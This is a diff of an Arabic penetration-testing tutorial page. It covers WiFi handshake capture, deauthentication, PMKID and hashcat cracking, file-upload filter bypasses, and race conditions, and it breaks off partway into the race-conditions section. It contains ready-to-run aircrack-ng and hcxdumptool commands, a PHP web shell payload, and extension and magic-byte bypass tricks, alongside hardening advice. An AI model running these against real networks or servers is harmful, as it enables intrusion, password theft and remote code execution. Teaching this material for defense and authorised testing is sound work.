-        <p>نقطة وصول مزيفة تنتحل (ESSID/BSSID) للشبكة الشرعية، تُستخدم لسرقة البيانات بعد تنفيذ Deauth Attack.</p>
-      </div>
-      <div class="goal-card">
-        <div class="goal-icon">🦷</div>
-        <h4>Bluetooth Hacks</h4>
-        <div class="goal-subtitle">Bluebugging</div>
-        <p>رسائل مزعجة (Bluejacking)، سرقة بيانات (Bluesnarfing)، وسيطرة كاملة على الهاتف (Bluebugging).</p>
+  <!-- ═══ SECTION 2: THEORY — WPA2 vs WPA3 & Handshake ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — تطور بروتوكولات التشفير والـ 4-Way Handshake</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تطورت معايير تشفير شبكات الواي فاي (802.11) لمعالجة الثغرات الأمنية المتراكمة. يعتمد فهم الهجمات اللاسلكية على فهم كيفية تأسيس الاتصال الآمن.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🤝 آلية WPA2 4-Way Handshake</h4>
+          <p>
+            عند اتصال جهاز بالشبكة، تتم عملية مصافحة رباعية للتحقق من كلمة المرور (Pre-Shared Key - PSK) دون إرسالها على الهواء مباشرة:
+          </p>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Anonce:</strong> يرسل الـ AP قيمة عشوائية (ANonce) إلى العميل.</li>
+            <li><strong>Snonce + MIC:</strong> يقوم العميل بإنشاء قيمة عشوائية (Snonce) ويحسب الـ PTK (Pairwise Transient Key) ويرسل الـ Snonce مع الـ MIC (Message Integrity Code) لتأكيد صحة التشفير.</li>
+            <li><strong>GTK + MIC:</strong> يرسل الـ AP الـ Group Temporal Key مشفراً لتشفير البث الجماعي.</li>
+            <li><strong>ACK:</strong> يرسل العميل تأكيداً (ACK) لبدء إرسال البيانات المشفرة.</li>
+          </ul>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">🛡️ WPA3 &amp; SAE (Simultaneous Authentication of Equals)</h4>
+          <p>
+            يقدم <strong>WPA3</strong> حماية جوهرية للتغلب على ثغرات WPA2 الكلاسيكية:
+          </p>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Forward Secrecy:</strong> يمنع فك تشفير البيانات المسجلة مسبقاً حتى لو تم كسر كلمة المرور لاحقاً.</li>
+            <li><strong>SAE Protocol:</strong> يستبدل المصافحة الرباعية ببروتوكول Dragonfly التبادلي لمنع هجمات القاموس أوفلاين (Offline Dictionary Attacks).</li>
+            <li><strong>Protected Management Frames (PMF):</strong> يمنع هجمات إلغاء الاتصال العشوائية (Deauthentication Attacks).</li>
+          </ul>
+        </div>
       </div>
     </div>
   </div>
 
-  <div class="meth-section">
-    <div class="section-header">
-      <span class="section-icon">🛠️</span>
-      <h3>أرسنال الأدوات הلاسلكية (Wireless Arsenal)</h3>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح الهجوم — Evil Twin &amp; Handshake Capture</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">Monitor Mode &amp; Reconnaissance</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">تحويل بطاقة الشبكة اللاسلكية إلى وضع المراقبة (Monitor Mode) للتمكن من الاستماع لكل الحزم التي تمر بالهواء على مختلف القنوات.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Enable Monitor Mode
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+
+# Sniff and discover networks
+sudo airodump-ng wlan0mon</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(0,229,255,0.15); color: var(--tool-color); border: 1px solid var(--tool-color); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Target Sniffing &amp; Deauthentication Attack</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">التركيز على الشبكة المستهدفة وإرسال إشارات طرد (Deauth Frames) للعملاء المتصلين لإجبارهم على إعادة الاتصال والتقاط الـ Handshake.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Focus packet capture on target BSSID and Channel
+sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake_output wlan0mon
+
+# Send Deauth frames in another terminal to disconnect a client
+sudo aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,110,39,0.15); color: #ff6e27; border: 1px solid #ff6e27; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">WPA2 Offline Cracking (Hashcat)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">تحويل المصافحة الرباعية الملتقطة إلى تنسيق يفهمه Hashcat وتجربة كسر كلمة المرور أوفلاين باستخدام طاقة المعالج الرسومي (GPU).</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Convert cap to hashcat format (using hcxtools)
+hcxpcapngtool -o hash.hc22000 handshake_output-01.cap
+
+# Attack using Hashcat (using GPU)
+hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(80,250,123,0.15); color: #50fa7b; border: 1px solid #50fa7b; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 15px; background: rgba(255,85,85,0.05); border-right: 3px solid #ff5555; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">4️⃣</span>
+          <div>
+            <strong style="color: #ff5555;">PMKID Attack (Clientless Attack)</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">هجوم بدون مستخدمين: يتم التواصل مع نقطة الوصول وسحب الـ PMKID مباشرة من الإطار الأول لمصافحة AP دون الحاجة لانتظار اتصال أي جهاز.</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Capture PMKID dynamically
+sudo hcxdumptool -i wlan0 -o pmkid_capture.pcapng --enable_status=1
+
+# Extract PMKID to hash format
+hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng
+
+# Crack PMKID with Hashcat
+hashcat -m 22000 pmkid.hc22000 wordlist.txt</div>
+            <button onclick="navigator.clipboard.writeText(this.previousElementSibling.innerText)" style="margin-top:5px; background: rgba(255,85,85,0.15); color: #ff5555; border: 1px solid #ff5555; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8rem;">📋 Copy</button>
+          </div>
+        </div>
+      </div>
     </div>
-    <div class="cyber-card" style="--tool-color: #00e5a0;">
-      <div class="card-header"><h4>Aircrack-ng Suite</h4></div>
-      <p>الأداة الأقوى لاختراق الشبكات. تتكون من (airmon-ng) للمراقبة، (airodump-ng) لالتقاط الحزم، (aireplay-ng) للحقن، و (aircrack-ng) لكسر المفاتيح.</p>
-      <div class="cmd-block">
-        <div class="cmd-header"><span class="cmd-lang">Terminal</span></div>
-        <pre><code># تفعيل وضع المراقبة
-airmon-ng start wlan0
+  </div>
 
-# التقاط مصافحة WPA
-airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
+  <!-- ═══ SECTION 4: TOOLS MATRIX ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛠️ مقارنة أدوات الاختراق اللاسلكي</h3></div>
+    <div>
+      <table class="cyber-table" style="width: 100%;">
+        <thead>
+          <tr>
+            <th>الأداة</th>
+            <th>الاستخدام الرئيسي</th>
+            <th>نقاط القوة</th>
+            <th>أمر أساسي</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong style="color: var(--tool-color);">Aircrack-ng</strong></td>
+            <td>التقاط وفحص وحقن الحزم وكسر WEP/WPA</td>
+            <td>المعيار الذهبي الكلاسيكي، خفيف وسريع</td>
+            <td><code>airodump-ng wlan0mon</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #ff6e27;">hcxdumptool</strong></td>
+            <td>التقاط المصافحات والـ PMKID مباشرة</td>
+            <td>يعمل بدون مستخدمين (Clientless) وحديث جداً</td>
+            <td><code>hcxdumptool -i wlan0 -o out.pcapng</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #50fa7b;">Reaver</strong></td>
+            <td>استغلال ثغرة WPS PIN</td>
+            <td>كسر الحماية والحصول على كلمة المرور في ساعات</td>
+            <td><code>reaver -i wlan0mon -b BSSID -vv</code></td>
+          </tr>
+          <tr>
+            <td><strong style="color: #bd93f9;">Fluxion</strong></td>
+            <td>هجوم التوأم الشرير الاجتماعي (Social Evil Twin)</td>
+            <td>توليد صفحة تسجيل دخول وهمية تطرد العميل وتطلب كلمة السر</td>
+            <td><code>sudo ./fluxion.sh</code></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 
-# هجوم Deauth لطرد العميل
-aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</code></pre>
+  <!-- ═══ SECTION 5: DEFENSE & HARDENING ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تحصين الشبكات اللاسلكية</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ تحصين بيئة الشركات والمنازل</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>Enterprise Mode (802.1X):</strong> استخدام مصادقة الخادم عن طريق RADIUS/TACACS+ بحيث يمتلك كل مستخدم حسابه ورقمه الخاص بدلاً من كلمة مرور واحدة للجميع (PSK).</li>
+          <li><strong>Disable WPS:</strong> إيقاف ميزة WPS (Wi-Fi Protected Setup) بالكامل لمنع هجمات التخمين التلقائي للـ PIN.</li>
+          <li><strong>WPA3 Transition:</strong> الانتقال الفوري لمعيار WPA3 لتفادي هجمات كسر المصافحة الرباعية وإلغاء الاتصال العشوائي.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 الإعدادات والسياسات الآمنة</h4>
+        <ul style="line-height: 2; color: var(--text-secondary);">
+          <li><strong>Strong Passphrase:</strong> استخدام كلمة مرور تزيد عن 16 خانة تحتوي على رموز وأرقام وحروف مختلفة لمنع كسرها أوفلاين.</li>
+          <li><strong>Isolation:</strong> عزل شبكات الضيوف (Guest VLAN) عن الشبكة الحيوية للشركة (Internal LAN).</li>
+        </ul>
       </div>
     </div>
   </div>
@@ -6835,245 +8249,537 @@ aws s3 ls</div>
       </div>
 
       <!-- Phase 11: File Upload Exploits -->
-      <div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #f59e0b;">
+<div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #fbbf24;" dir="rtl">
 
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📁</span> File Upload Exploits - Deep Dive</h2>
-          <p class="hero-tagline">منهجية تخطي فلاتر الرفع، تزوير امتدادات الملفات، والوصول إلى Remote Code Execution (RCE)</p>
-        </div>
+  <!-- ═══ SECTION 1: HERO ═══ -->
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">📤</span> File Upload Bypass — تخطي فلاتر رفع الملفات</h2>
+    <p class="hero-tagline">منهجية رفع ملفات الـ Web Shell وتخطي فلاتر الامتداد ونوع الملف وحجمه للحصول على RCE</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Web Shells · Burp Suite · EXIF modification · Magic Bytes</span>
+      <span class="badge badge-info">📋 OWASP: Unrestricted File Upload | Remote Code Execution</span>
+      <span style="background: rgba(251,191,36,0.15); color: #fbbf24; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High → Critical (RCE)</span>
+    </div>
+  </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. فهم فلاتر رفع الملفات وكيفية تخطيها</h3></div>
-          <p>يعتمد السيرفر عادة على عدة فلاتر للتحقق من الملف المرفوع. يجب عليك اختبارها واحدة تلو الأخرى لاكتشاف نقطة الضعف:</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Client-Side Filters:</strong> يتم الفحص بواسطة الجافاسكريبت في المتصفح. يمكن تخطيها بسهولة باعتراض الطلب عبر Burp Suite وتغيير الملف قبل وصوله للسيرفر.</li>
-            <li>✔ <strong>Content-Type Spoofing:</strong> السيرفر يفحص ترويسة <code>Content-Type</code> في الطلب. قم بتغييرها من <code>application/x-php</code> إلى <code>image/jpeg</code> لتمرير الملف.</li>
-            <li>✔ <strong>Extension Blacklisting Bypass:</strong> إذا كان السيرفر يمنع <code>.php</code>، جرب امتدادات بديلة ينفذها السيرفر: <code>.php3, .php4, .php5, .phtml, .phar</code> أو <code>.jspx, .jspf</code> في الجافا، أو <code>.ashx, .asmx</code> في الـ .NET.</li>
+  <!-- ═══ SECTION 2: THEORY — Vulnerability Mechanics ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — كيف تحدث ثغرات رفع الملفات غير المقيدة</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تحدث ثغرة **Unrestricted File Upload** عندما يسمح خادم الويب للمستخدمين برفع ملفات عشوائية إلى نظام الملفات الداخلي دون فلترة كافية لنوع الملف وامتداده وموقعه، ويسمح بتنفيذ هذه الملفات لاحقاً في المتصفح.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🔍 أنواع التحقق من الملفات (Filters Validation)</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>Client-Side Validation:</strong> فحص الامتداد بواسطة Javascript في المتصفح قبل إرسال الطلب (أسهل نوع للتخطي عبر Burp Suite).</li>
+            <li><strong>Extension Blacklisting:</strong> حظر امتدادات محددة (مثل <code>.php, .asp, .jsp</code>). يمكن تخطيه باستخدام امتدادات بديلة أو تلاعب بالحروف.</li>
+            <li><strong>MIME Type Validation:</strong> فحص ترويسة <code>Content-Type</code> في طلب الـ HTTP (مثال: <code>image/png</code>).</li>
+            <li><strong>Magic Bytes (File Signature):</strong> قراءة أول بضع بايتات من الملف للتأكد من بنيته الحقيقية (مثل بايتات GIF89a).</li>
           </ul>
         </div>
+        <div>
+          <h4 style="color: #ff6e27;">🔥 الأثر الفعلي والـ Web Shell</h4>
+          <p>
+            الهدف النهائي للمهاجم هو رفع ملف **Web Shell** (كود برمجى بلغة السيرفر مثل PHP/ASP) يقبل الأوامر من خلال المتصفح وينفذها على نظام الخادم للوصول الكامل.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ 2. حيل التخطي المتقدمة (Advanced Bypasses)</h3></div>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>التقنية (Technique)</th>
-                <th>شرح الاستغلال (How it works)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>Double Extensions</strong></td>
-                <td>رفع الملف باسم <code>shell.php.jpg</code> أو <code>shell.jpg.php</code>. يعتمد على خطأ في إعدادات السيرفر (مثل Apache AddHandler) حيث يقرأ السيرفر أول امتداد ويتجاهل الثاني، أو العكس.</td>
-              </tr>
-              <tr>
-                <td><strong>Null Byte Injection</strong></td>
-                <td>استخدام بايت فارغ لقطع السلسلة النصية: <code>shell.php%00.jpg</code>. فلاتر اللغة تعتبره صورة، بينما نظام التشغيل يقطع الاسم عند البايت الفارغ ويحفظه كـ <code>shell.php</code> (فعال في إصدارات PHP القديمة).</td>
-              </tr>
-              <tr>
-                <td><strong>Magic Bytes (File Signatures)</strong></td>
-                <td>السيرفر يفحص أول بايتات من الملف للتأكد من نوعه. أضف بايتات الصورة الوهمية في بداية كود الـ PHP الخاص بك: <br><code>GIF89a;<br>&lt;?php system($_GET['cmd']); ?&gt;</code></td>
-              </tr>
-              <tr>
-                <td><strong>Overwriting Config Files</strong></td>
-                <td>رفع ملف <code>.htaccess</code> خبيث (في Apache) لتوجيه السيرفر لتنفيذ ملفات الصور كأنها PHP: <br><code>AddType application/x-httpd-php .jpg</code><br>ثم ارفع الـ Web Shell باسم <code>shell.jpg</code> وسيعمل بنجاح.</td>
-              </tr>
-            </tbody>
-          </table></div>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح طرق التخطي (Bypass Techniques) خطوة بخطوة</h3></div>
+    <div>
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="display: flex; gap: 15px; background: rgba(0,229,255,0.05); border-right: 3px solid var(--tool-color); padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">1️⃣</span>
+          <div>
+            <strong style="color: var(--tool-color);">MIME Type &amp; Client-Side Bypass</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إيقاف كود الـ JS في المتصفح أو التقاط الطلب في Burp Suite وتغيير ترويسة الـ Content-Type لتبدو كصورة مقبولة:</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Original request header captured:
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
+
+# Modify to look like image:
+Content-Type: image/png</div>
+          </div>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🖼️</span> 3. استغلال ثغرات مكتبات الصور (Image Processing Vulns)</h3></div>
-          <ul class="t-check-list">
-            <li><strong>ImageTragick (CVE-2016-3714):</strong> إذا كان الموقع يستخدم ImageMagick لتعديل الصور، ارفع ملف صورة يحتوي على كود استغلال لتشغيل أوامر نظامية أثناء معالجة الصورة.</li>
-            <li><strong>ExifTool/Metadata:</strong> حقن بايلود XSS أو Command Injection في بيانات وصف الصورة (Exif Data) مثل <code>exiftool -Comment='&lt;script&gt;alert(1)&lt;/script&gt;' image.jpg</code>، وعندما يعرض الموقع هذه البيانات، يتم تنفيذ البايلود.</li>
-            <li><strong>Polyglot Files:</strong> إنشاء ملف صالح كصورة وصالح كسكربت جافاسكريبت/PHP في نفس الوقت لتجاوز أدق فلاتر معالجة الصور المتقدمة.</li>
-          </ul>
+        <div style="display: flex; gap: 15px; background: rgba(255,110,39,0.05); border-right: 3px solid #ff6e27; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">2️⃣</span>
+          <div>
+            <strong style="color: #ff6e27;">Blacklist Bypass &amp; Alternative Extensions</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">استخدام امتدادات نادرة أو متوافقة يقبلها نظام الحماية بينما يترجمها السيرفر كملف قابل للتنفيذ:</p>
+            <ul style="color: var(--text-secondary); font-size: 0.85rem; line-height: 1.8; margin-top: 5px;">
+              <li><strong>PHP Alternatives:</strong> <code>.php3, .php4, .php5, .phtml, .phar</code></li>
+              <li><strong>ASP Alternatives:</strong> <code>.aspx, .cer, .asa</code></li>
+              <li><strong>Double Extensions:</strong> <code>shell.png.php</code> أو <code>shell.png.pHp5</code></li>
+              <li><strong>Null Byte Injection (Older servers):</strong> <code>shell.php%00.png</code></li>
+            </ul>
+          </div>
         </div>
-    
 
-<!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p11" onclick="markPhaseComplete('p11','p12')">
-          ✅ Mark Phase Complete — File Upload Exploits Done → Proceed to Race Conditions
-        </button>
+        <div style="display: flex; gap: 15px; background: rgba(80,250,123,0.05); border-right: 3px solid #50fa7b; padding: 15px; border-radius: 6px;">
+          <span style="font-size: 1.5rem; min-width: 40px;">3️⃣</span>
+          <div>
+            <strong style="color: #50fa7b;">Magic Bytes Bypass &amp; EXIF Injection</strong>
+            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px; line-height: 1.7;">إدراج الـ Magic Bytes للصور في أول سطر للملف لخدع فلتر الفحص البرمجى، أو حقن كود الـ PHP بالكامل داخل خانة التعليق لملف الصورة الفعلي (EXIF Metadata) ورفعها بصيغة صورة:</p>
+            <div class="cmd-ui-box" style="margin-top: 8px;">
+# Magic Bytes for GIF in the first line of PHP file:
+GIF89a;
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Inject using exiftool:
+exiftool -Comment="&lt;?php system(\$_GET['cmd']); ?&gt;" image.png
+mv image.png shell.php.png</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين رفع الملفات بالكامل</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ حماية الكود البرمجي ونظام التخزين</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Randomize File Names:</strong> تغيير اسم الملف المرفوع تلقائياً إلى قيمة عشوائية Hash (مثال: UUID) لقطع الطريق على المهاجم لمعرفة مسار الملف بعد الرفع.</li>
+          <li><strong>Storage Isolation:</strong> تخزين الملفات المرفوعة في سيرفر معزول تماماً أو خدمات تخزين سحابية (S3 / Storage buckets) بدلاً من استضافتها على خادم التطبيق الرئيسي.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 تحصين الخوادم ومنع التنفيذ</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Non-Executable Permissions:</strong> إزالة صلاحيات التنفيذ (Execution Permissions) تماماً عن مجلد الرفع.</li>
+          <li><strong>Web Server Configuration:</strong> منع السيرفر من معالجة ملفات الرفع برمجياً. مثال بملف <code>.htaccess</code> لمجلد الرفع:</li>
+          <pre style="background: #282a36; padding: 10px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code># Disable script execution
+&lt;Files ~ "\.(php|php3|php4|php5|phtml|pl|py|jsp|asp|sh|cgi)$"&gt;
+  ForceType text/plain
+&lt;/Files&gt;</code></pre>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- MARK COMPLETE -->
+  <button class="mark-complete-btn" id="complete-btn-p11" onclick="markPhaseComplete('p11','p7')">
+    ✅ Mark Phase Complete — File Upload Done → Proceed to XSS Workflow
+  </button>
+
 </div>
+
       </div>
 
       <!-- Phase 12: Race Conditions -->
-      <div class="meth-content-view" id="meth-content-p12" style="display: none; --tool-color: #f43f5e;">
+<div class="meth-content-view" id="meth-content-p12" style="display: none; --tool-color: #f43f5e;" dir="rtl">
 
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">⚡</span> Race Conditions - Deep Dive</h2>
-          <p class="hero-tagline">منهجية التلاعب بالزمن المتزامن، هجمات الـ Single-Packet، وتخطي حدود العمليات المسموحة</p>
+  <!-- ═══ SECTION 1: HERO ═══ -->
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">⚡</span> Race Conditions &amp; TOCTOU — ثغرات التزامن</h2>
+    <p class="hero-tagline">شرح آلية استغلال ثغرات سباق التزامن (Concurrency) والـ Time-of-Check to Time-of-Use لتنفيذ هجمات مالية أو تخطي القيود</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Burp Suite Turbo Intruder · Multi-threading scripts</span>
+      <span class="badge badge-info">📋 OWASP: Concurrency Flaws | API Vulnerability</span>
+      <span style="background: rgba(244,63,94,0.15); color: #f43f5e; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: High (Financial &amp; PrivEsc)</span>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 2: THEORY — Concurrency and TOCTOU ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — مفهوم التعددية والتزامن وأخطاء التصميم</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تحدث ثغرات <strong>Race Conditions</strong> عندما يعالج خادم الويب طلبات متعددة بشكل متوازٍ (Multi-threaded execution) دون تطبيق قيود تمنع الوصول المتزامن لنفس المورد.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">⏳ فجوة الـ Check and Use (TOCTOU)</h4>
+          <p>
+            تعتمد الثغرة على وجود فجوة زمنية بسيطة جداً (أجزاء من الثانية) بين عمليتين:
+            <br>1. **Time-of-Check (وقت الفحص):** السيرفر يفحص إن كان المستخدم يملك رصيداً كافياً أو لم يسبق له استخدام الكوبون.
+            <br>2. **Time-of-Use (وقت الاستخدام):** السيرفر يقوم بخصم الرصيد أو تفعيل الكوبون.
+          </p>
+          <p>
+            إذا أرسل المهاجم 20 طلباً متزامناً في نفس اللحظة تماماً، فسيقوم السيرفر بعملية الفحص (Check) لجميع الطلبات في نفس الوقت قبل أن يكتمل أي طلب للتحديث (Use)، فيقبل السيرفر تنفيذ الطلبات العشرين كلها!
+          </p>
         </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 1. فهم ثغرات حالة السباق (Concurrency Flaws)</h3></div>
-          <p>تحدث هذه الثغرة عندما يقوم السيرفر بمعالجة عدة طلبات متزامنة (Concurrent Requests) تتشارك نفس الموارد (כقاعدة البيانات أو رصيد الحساب) دون عمل "إقفال" (Locking) صحيح للمتغيرات. نتيجة لذلك، تتداخل المعاملات.</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Limit Overrun:</strong> تجاوز الحد المسموح. (مثال: استخدام كوبون خصم واحد 50 مرة في نفس اللحظة للحصول على خصم ضخم).</li>
-            <li>✔ <strong>Time-of-check to time-of-use (TOCTOU):</strong> السيرفر يتحقق من الرصيد (الخطوة 1)، وقبل أن يخصم الرصيد (الخطوة 2)، يتلقى طلباً آخر وراءه مباشرة. ينجح كلا الطلبين برصيد لا يكفي إلا لطلب واحد!</li>
+        <div>
+          <h4 style="color: #ff6e27;">🛡️ أشهر بيئات وقوع ثغرات التزامن</h4>
+          <ul style="line-height: 1.8; font-size: 0.9rem;">
+            <li><strong>الأنظمة المالية:</strong> سحب الأموال أو تحويلها لأكثر من جهة في نفس الوقت.</li>
+            <li><strong>أنظمة الخصومات والكوبونات:</strong> تطبيق الكوبون مرة واحدة بينما ينجح استغلال التزامن في تفعيله عدة مرات.</li>
+            <li><strong>أنظمة التصويت والتقييمات:</strong> زيادة عدد الأصوات بشكل غير محدود.</li>
           </ul>
         </div>
+      </div>
+    </div>
+  </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ 2. تقنية الـ Single-Packet Attack (المزامنة القصوى)</h3></div>
-          <p>في الماضي كنا نستخدم Burp Intruder وعدد كبير من الـ Threads. لكن المشكلة أن زمن انتقال الشبكة (Network Latency) كان يفسد التزامن. الآن نستخدم <strong>HTTP/2 Single-Packet Attack</strong>:</p>
-          <div class="table-wrapper"><table class="interactive-table">
-            <thead>
-              <tr>
-                <th>الفرق</th>
-                <th>Traditional Attack (Intruder)</th>
-                <th>Single-Packet Attack (HTTP/2)</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><strong>آلية الإرسال</strong></td>
-                <td>يتم إرسال كل طلب في TCP Packet منفصلة، مما يسبب تأخير بأجزاء من الثانية بين كل طلب.</td>
-                <td>في بروتوكول HTTP/2، يمكن تجميع 20-30 طلباً معاً، وإرسال جميع الطلبات <strong>في حزمة شبكة واحدة (TCP Packet)</strong> لتصل السيرفر في اللحظة ذاتها بالمايكرو ثانية.</td>
-              </tr>
-              <tr>
-                <td><strong>نسبة النجاح</strong></td>
-                <td>ضعيفة جداً، وتعتمد على صدفة التوقيت وسرعة الاتصال.</td>
-                <td>شبه مؤكدة (100% Synchronization) لتخطي أدق آليات الحماية.</td>
-              </tr>
-              <tr>
-                <td><strong>الأداة المفضلة</strong></td>
-                <td>Turbo Intruder القديم.</td>
-                <td>Burp Suite Repeater (Send Group in Parallel) المدمجة حديثاً.</td>
-              </tr>
-            </tbody>
-          </table></div>
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
